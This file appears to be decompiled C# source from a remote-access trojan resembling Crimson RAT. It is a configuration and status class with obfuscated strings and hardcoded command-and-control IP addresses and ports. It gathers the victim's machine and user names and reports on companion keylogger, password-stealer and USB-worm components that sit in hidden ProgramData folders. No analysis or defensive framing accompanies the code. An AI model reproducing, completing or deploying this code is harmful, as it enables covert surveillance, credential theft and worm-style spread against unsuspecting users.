using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace thandhwiar;

public class GCANONF
{
	public string mainsAepp = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());

	public string pc_isd = "hdamra|".Split(new char[1] { '|' })[0];

	public string dy_isd = "0|".Split(new char[1] { '|' })[0];

	public byte[] vpsipzs = new byte[24]
	{
		49, 52, 52, 46, 57, 49, 46, 55, 57, 46,
		52, 48, 63, 111, 116, 98, 109, 97, 105, 108,
		46, 99, 111, 109
	};

	public string kiysAdpp = "hlhrrasca|".Split(new char[1] { '|' })[0];

	public string filesPath = Application.get_ExecutablePath();

	public string flshsPath = "\\Khlrcnar\\|".Split(new char[1] { '|' })[0];

	public string usbswdrm = "iarswn|".Split(new char[1] { '|' })[0];

	public string psssAdpp = "thsalrarc|".Split(new char[1] { '|' })[0];

	public string defauxltP = "206.215.155.105|".Split(new char[1] { '|' })[0];

	public string remvxUser = "fthuivnua|".Split(new char[1] { '|' })[0];

	public string keexPath = "\\Mthehsca\\|".Split(new char[1] { '|' })[0];

	public string usbxApp = "datrliarw|".Split(new char[1] { '|' })[0];

	public string podrt = "12427, 6226, 18835, 16224, 20716";

	public string apdver;

	public string cdname = "";

	public string undame = "";

	public string lancadrd = "";

	public string duip = "";

	public short scrdSize = 210;

	public string pasxPath = "\\Phvmaci\\|".Split(new char[1] { '|' })[0];

	public string mpath => Path.GetDirectoryName(filesPath) + "\\";

	public string ppxath => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + pasxPath;

	public void screenSsize(string scedSize)
	{
		try
		{
			scrdSize = Convert.ToInt16(scedSize.Split(new char[1] { '>' })[0].Trim());
		}
		catch
		{
		}
	}

	public void Inxfo()
	{
		apdver = "4.0.0.1!".Split(new char[1] { '!' })[0];
		cdname = Environment.MachineName;
		undame = Environment.UserName;
	}

	public byte[] getBytedArray(string value)
	{
		char[] array = value.ToCharArray();
		byte[] array2 = new byte[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			byte b = (array2[i] = Convert.ToByte(array[i]));
		}
		return array2;
	}

	public byte[] getBytexArray(string value)
	{
		char[] array = value.ToCharArray();
		byte[] array2 = new byte[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			byte b = (array2[i] = Convert.ToByte(array[i]));
		}
		return array2;
	}

	public byte[] apps_staxtus()
	{
		try
		{
			string text = "";
			string text2 = "0.0.0.0|".Split(new char[1] { '|' })[0];
			string text3 = "true!".Split(new char[1] { '!' })[0];
			text = "maina#Runing|ver#!".Split(new char[1] { '!' })[0] + apdver + "|name#!".Split(new char[1] { '!' })[0] + mainsAepp + "|path#!".Split(new char[1] { '!' })[0] + mpath + "|fileslog=!".Split(new char[1] { '!' })[0] + "N/A|apkey#!".Split(new char[1] { '!' })[0] + pc_isd + ">|".Split(new char[1] { '|' })[0];
			if (File.Exists(kiPsath() + kiysAdpp + ".exe!".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(kiPsath() + kiysAdpp + ".exe!".Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName = Process.GetProcessesByName(kiysAdpp);
				text3 = ((processesByName.Length != 0) ? "Runing!".Split(new char[1] { '!' })[0] : "Not Runing!".Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = "0.0.0.0!".Split(new char[1] { '!' })[0];
				text3 = "Not Present!".Split(new char[1] { '!' })[0];
			}
			text = text + "keeap#!".Split(new char[1] { '!' })[0] + text3 + "|ver#!".Split(new char[1] { '!' })[0] + text2 + "|name#!".Split(new char[1] { '!' })[0] + kiysAdpp + "|path#!".Split(new char[1] { '!' })[0] + kiPsath() + "|logfile#!".Split(new char[1] { '!' })[0] + kiysAdpp + ">|".Split(new char[1] { '|' })[0];
			if (File.Exists(ppxath + psssAdpp + ".exe!".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(ppxath + psssAdpp + ".exe!".Split(new char[1] { '!' })[0]).ProductVersion;
				text3 = "Present!".Split(new char[1] { '!' })[0];
			}
			else
			{
				text2 = "0.0.0.0!".Split(new char[1] { '!' })[0];
				text3 = "Not Present!".Split(new char[1] { '!' })[0];
			}
			text = text + "pasap#!".Split(new char[1] { '!' })[0] + text3 + "|ver#!".Split(new char[1] { '!' })[0] + text2 + "|name#!".Split(new char[1] { '!' })[0] + psssAdpp + "|path#!".Split(new char[1] { '!' })[0] + ppxath + "|logfile#!".Split(new char[1] { '!' })[0] + psssAdpp + ">|".Split(new char[1] { '|' })[0];
			if (File.Exists(usbxPath() + usbxApp + ".exe!".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(usbxPath() + usbxApp + ".exe!".Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName2 = Process.GetProcessesByName(usbxApp);
				text3 = ((processesByName2.Length != 0) ? "Runing!".Split(new char[1] { '!' })[0] : "Not Runing!".Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = "0.0.0.0!".Split(new char[1] { '!' })[0];
				text3 = "Not Present!".Split(new char[1] { '!' })[0];
			}
			text = text + "usbap#!".Split(new char[1] { '!' })[0] + text3 + "|ver#!".Split(new char[1] { '!' })[0] + text2 + "|name#!".Split(new char[1] { '!' })[0] + usbxApp + "|path#!".Split(new char[1] { '!' })[0] + usbxPath() + "|logfile#!".Split(new char[1] { '!' })[0] + usbxApp + "|usbwrm#!".Split(new char[1] { '!' })[0] + usbswdrm + ">|".Split(new char[1] { '|' })[0];
			return getBytexArray(text);
		}
		catch
		{
			return null;
		}
	}

	public string kiPsath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + keexPath;
	}

	public string Ossname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!".Split(new char[1] { '!' })[0];
		}
	}

	public string usbxPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + flshsPath;
	}
}
